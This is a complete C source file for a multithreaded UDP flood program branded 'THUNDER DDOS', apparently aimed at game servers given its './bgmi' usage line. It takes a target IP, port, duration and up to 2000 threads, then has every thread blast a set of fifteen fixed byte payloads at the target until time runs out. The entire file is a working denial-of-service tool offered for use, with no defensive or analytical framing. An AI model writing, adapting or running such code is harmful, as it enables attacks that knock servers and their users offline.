#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define VERSION "THUNDER DDOS"
#define MAX_PAYLOADS 15

// Color codes for output
#define RED "\x1b[31m"
#define GREEN "\x1b[32m"
#define YELLOW "\x1b[33m"
#define BLUE "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN "\x1b[36m"
#define RESET "\x1b[0m"

void banner() {
    printf(YELLOW "\n");
    printf("╔═══════════════════════════════════════════════╗\n");
    printf("║     ████████╗██╗  ██╗██╗   ██╗███╗   ██╗██████╗ ███████╗██████╗     ║\n");
    printf("║     ╚══██╔══╝██║  ██║██║   ██║████╗  ██║██╔══██╗██╔════╝██╔══██╗    ║\n");
    printf("║        ██║   ███████║██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝    ║\n");
    printf("║        ██║   ██╔══██║██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗    ║\n");
    printf("║        ██║   ██║  ██║╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║    ║\n");
    printf("║        ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝    ║\n");
    printf("║                   DDOS BOT                      ║\n");
    printf("║                  " VERSION "                    ║\n");
    printf("╚═══════════════════════════════════════════════╝\n" RESET);
}

void usage() {
    banner();
    printf(YELLOW "\n📌 Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>\n");
    printf(YELLOW "📝 Example: ./bgmi 1.1.1.1 80 60 500\n");
    printf(YELLOW "⚠️  Threads: 100-2000 recommended\n" RESET);
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
    int thread_id;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    unsigned long packets_sent = 0;

    // THUNDER DDOS Payloads
    unsigned char payloads[MAX_PAYLOADS][16] = {
        {0x16, 0x9e, 0x56, 0xc2, 0xf0, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0x5a},
        {0x16, 0x9e, 0x56, 0xc2, 0xf4, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x3a},
        {0x16, 0x9e, 0x56, 0xc2, 0xc8, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0x1a},
        {0x16, 0x9e, 0x56, 0xc2, 0xcc, 0x22, 0xe3, 0x66, 0xf4, 0x6a, 0x55, 0xdf, 0x27, 0x01, 0x1c, 0xfa},
        {0x16, 0x9e, 0x56, 0xc2, 0xc0, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0xda},
        {0x16, 0x9e, 0x56, 0xc2, 0xc4, 0x22, 0x9e, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x16, 0x9e, 0x56, 0xc2, 0xd8, 0x22, 0x9e, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x16, 0x9e, 0x56, 0xc2, 0xdc, 0x22, 0xe3, 0x66, 0xf4, 0x54, 0x55, 0xdc, 0x27, 0x01, 0x1e, 0xba},
        {0x16, 0x9e, 0x56, 0xc2, 0xd0, 0x22, 0x9c, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x16, 0x9e, 0x56, 0xc2, 0xd4, 0x22, 0x9c, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x16, 0x9e, 0x56, 0xc2, 0x28, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0x9a},
        {0x16, 0x9e, 0x56, 0xc2, 0x2c, 0x22, 0x82, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
        {0x16, 0x9e, 0x56, 0xc2, 0x20, 0x22, 0xe3, 0x66, 0xf4, 0x6b, 0xd5, 0xdc, 0x27, 0x01, 0x1d, 0x7a},
        {0x16, 0x9e, 0x56, 0xc2, 0x24, 0x22, 0x80, 0x48, 0xec, 0x74, 0xb9, 0xc5, 0x41, 0xb0, 0xfc, 0x37},
        {0x16, 0x9e, 0x56, 0xc2, 0x38, 0x22, 0x80, 0xc8, 0xf5, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
    };
    
    int payload_count = sizeof(payloads) / sizeof(payloads[0]);
    
    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        free(data);
        pthread_exit(NULL);
    }
    
    // Set socket options for better performance
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);
    
    endtime = time(NULL) + data->time;
    
    printf(YELLOW "[Thread %d] Started attacking %s:%d\n" RESET, 
           data->thread_id, data->ip, data->port);
    
    while (time(NULL) <= endtime) {
        for (int i = 0; i < payload_count; i++) {
            if (sendto(sock, payloads[i], sizeof(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                break;
            }
            packets_sent++;
        }
    }
    
    printf(YELLOW "[Thread %d] Finished - Packets sent: %lu\n" RESET, 
           data->thread_id, packets_sent);
    
    close(sock);
    free(data);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    signal(SIGPIPE, SIG_IGN);
    
    if (argc != 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time_duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Validation
    if (threads <= 0 || threads > 2000) {
        printf(YELLOW "❌ Threads must be between 1-2000\n" RESET);
        return 1;
    }
    
    if (time_duration <= 0 || time_duration > 3600) {
        printf(YELLOW "❌ Time must be between 1-3600 seconds\n" RESET);
        return 1;
    }
    
    if (port <= 0 || port > 65535) {
        printf(YELLOW "❌ Invalid port number\n" RESET);
        return 1;
    }
    
    banner();
    
    printf(YELLOW "\n🎯 Target: %s:%d\n", ip, port);
    printf("⏱️  Duration: %d seconds\n", time_duration);
    printf("🔧 Threads: %d\n", threads);
    printf("📦 Payloads: %d\n" RESET, MAX_PAYLOADS);
    printf(YELLOW "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" RESET);
    
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct timeval start_time, end_time;
    
    gettimeofday(&start_time, NULL);
    
    // Launch threads
    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time_duration;
        data->thread_id = i + 1;
        
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }
    
    // Wait for all threads
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    gettimeofday(&end_time, NULL);
    
    long seconds = (end_time.tv_sec - start_time.tv_sec);
    long micros = ((seconds * 1000000) + end_time.tv_usec) - (start_time.tv_usec);
    
    free(thread_ids);
    
    printf(YELLOW "\n✅ Attack Finished!\n");
    printf("⏱️  Total time: %ld.%06ld seconds\n" RESET, seconds, micros);
    
    return 0;
}